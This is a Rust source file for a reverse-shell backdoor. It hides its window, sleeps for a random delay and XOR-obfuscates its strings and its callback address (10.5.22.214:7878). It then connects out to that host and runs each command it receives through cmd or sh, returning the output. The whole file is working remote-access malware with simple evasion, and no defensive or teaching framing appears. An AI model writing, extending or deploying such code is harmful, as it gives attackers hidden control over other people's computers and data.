#![windows_subsystem = "windows"]
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::env;
use std::path::PathBuf;
use std::fs::OpenOptions;
use std::thread;
use std::time::Duration;
use rand::Rng;
use dirs;
#[cfg(windows)]
use std::os::windows::process::CommandExt;

fn xor_obfuscate(s: &str, key: u8) -> Vec<u8> {
    s.bytes().map(|b| b ^ key).collect()
}

fn xor_deobfuscate(data: &[u8], key: u8) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ key).collect()).unwrap_or_default()
}

fn process_connection(mut stream: TcpStream) -> std::io::Result<()> {
    // Send initial "ready" message to synchronize
    let ready_msg = b"Client ready\n";
    let len = ready_msg.len() as u32;
    stream.write_all(&len.to_be_bytes())?;
    stream.write_all(ready_msg)?;
    stream.flush()?;

    let mut data_buffer = [0; 1024];
    let exit_cmd = xor_obfuscate("exit", 0x42);
    let shell_win = xor_obfuscate("cmd", 0x42);
    let shell_unix = xor_obfuscate("sh", 0x42);
    let cls_cmd = xor_obfuscate("cls", 0x42);
    let clear_cmd = xor_obfuscate("clear", 0x42);
    
    loop {
        // Clear buffer before reading
        data_buffer.fill(0);
        // Read command from server
        let bytes_read = stream.read(&mut data_buffer)?;
        if bytes_read == 0 {
            return Ok(());
        }

        let input = String::from_utf8_lossy(&data_buffer[..bytes_read]).trim().to_string();
        
        // Exit condition
        if input.as_bytes() == xor_obfuscate(&xor_deobfuscate(&exit_cmd, 0x42), 0x42) {
            let response = b"Goodbye\n";
            let len = response.len() as u32;
            stream.write_all(&len.to_be_bytes())?;
            stream.write_all(response)?;
            stream.flush()?;
            return Ok(());
        }

        // Skip empty input
        if input.is_empty() {
            let response = b"Empty command\n";
            let len = response.len() as u32;
            stream.write_all(&len.to_be_bytes())?;
            stream.write_all(response)?;
            stream.flush()?;
            continue;
        }

        // Split input into command and arguments
        let parts: Vec<&str> = input.split_whitespace().collect();
        if parts.is_empty() {
            let response = b"Invalid command\n";
            let len = response.len() as u32;
            stream.write_all(&len.to_be_bytes())?;
            stream.write_all(response)?;
            stream.flush()?;
            continue;
        }

        let cmd_name = parts[0];
        let args = &parts[1..];
        let current_dir = env::current_dir()?;

        // Handle cd command
        if cmd_name == "cd" {
            let target_dir = if args.is_empty() {
                dirs::home_dir().unwrap_or(current_dir)
            } else {
                PathBuf::from(args[0])
            };

            let response = match env::set_current_dir(&target_dir) {
                Ok(_) => {
                    let new_dir = env::current_dir()?;
                    format!("Changed directory to {}\n", new_dir.display())
                }
                Err(e) => format!("Error changing directory: {}\n", e),
            };
            let response_bytes = response.as_bytes();
            let len = response_bytes.len() as u32;
            stream.write_all(&len.to_be_bytes())?;
            stream.write_all(response_bytes)?;
            stream.flush()?;
            continue;
        }

        // Handle cls and clear commands
        if (cfg!(target_os = "windows") && cmd_name.as_bytes() == xor_obfuscate(&xor_deobfuscate(&cls_cmd, 0x42), 0x42)) || 
           (cfg!(not(target_os = "windows")) && cmd_name.as_bytes() == xor_obfuscate(&xor_deobfuscate(&clear_cmd, 0x42), 0x42)) {
            let response = b"Screen clear command executed\n";
            let len = response.len() as u32;
            stream.write_all(&len.to_be_bytes())?;
            stream.write_all(response)?;
            stream.flush()?;
            continue;
        }

        let output = if cfg!(target_os = "windows") {
            let mut cmd = Command::new(xor_deobfuscate(&shell_win, 0x42));
            cmd.args(&["/C", cmd_name])
               .args(args)
               .current_dir(current_dir)
               .stdout(Stdio::piped())
               .stderr(Stdio::piped())
               .creation_flags(0x08000000);
            cmd.output()
        } else {
            Command::new(xor_deobfuscate(&shell_unix, 0x42))
                .arg("-c")
                .arg(format!("{} {}", cmd_name, args.join(" ")))
                .current_dir(current_dir)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .output()
        };

        let response = match output {
            Ok(output) => {
                let mut response = Vec::new();
                response.extend_from_slice(&output.stdout);
                response.extend_from_slice(&output.stderr);
                if response.is_empty() {
                    response = b"Command executed successfully\n".to_vec();
                }
                response
            }
            Err(e) => format!("Error executing command: {}\n", e).into_bytes(),
        };
        let len = response.len() as u32;
        stream.write_all(&len.to_be_bytes())?;
        stream.write_all(&response)?;
        stream.flush()?;
    }
}

fn main() -> std::io::Result<()> {
    let delay = rand::thread_rng().gen_range(1000..5000);
    thread::sleep(Duration::from_millis(delay));

    if let Ok(mut file) = OpenOptions::new()
        .create(true)
        .append(true)
        .open("app_log.txt") {
        let _ = writeln!(file, "Application started at {:?}", std::time::SystemTime::now());
    }

    let remote_addr_obf = xor_obfuscate("10.5.22.214:7878", 0x42);
    let remote_addr = xor_deobfuscate(&remote_addr_obf, 0x42);
    
    let mut stream = TcpStream::connect(&remote_addr)?;
    stream.flush()?;
    
    process_connection(stream)?;

    Ok(())
}